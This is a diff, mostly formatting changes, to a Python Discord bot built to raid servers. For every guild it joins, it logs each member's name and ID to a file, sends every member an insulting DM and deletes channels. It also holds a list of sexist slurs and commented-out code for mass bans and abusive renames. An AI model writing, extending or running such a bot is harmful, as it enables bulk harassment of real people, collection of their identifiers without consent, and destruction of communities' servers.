@@ -15,12 +15,15 @@ bot = commands.Bot(
     intents=intents,
 )
 
+
 def log(stuff):
     print(stuff)
     with open("data.txt", "a+") as f:
         f.write(stuff + "\n")
 
+
 messages = ["troll", "kekw", "lol", "xd", "you're a hoe", "you're a whore"]
+
 
 @bot.event
 async def on_ready():
@@ -29,15 +32,22 @@ async def on_ready():
     for g in bot.guilds:
         log("Start of " + g.name + ", id: " + str(g.id))
         async for lad in g.fetch_members():
-            log("- Member: " + lad.name + " # " + lad.discriminator + " , ID: " + str(lad.id))
+            log(
+                "- Member: "
+                + lad.name
+                + " # "
+                + lad.discriminator
+                + " , ID: "
+                + str(lad.id)
+            )
             try:
                 await lad.send("You suck!")
             except:
                 print("Failed to DM")
 
-            #try:
+            # try:
             #    await g.ban(lad)
-            #except:
+            # except:
             #    log("Failed to ban. Trying to rename.")
             #    try:
             #        await lad.edit(nick="Fuckhead")
@@ -54,5 +64,6 @@ async def on_ready():
                 await channel.delete()
             except Exception as e:
                 print("Failed to delete " + str(channel.name) + " because: " + str(e))
+
 
 bot.run("")
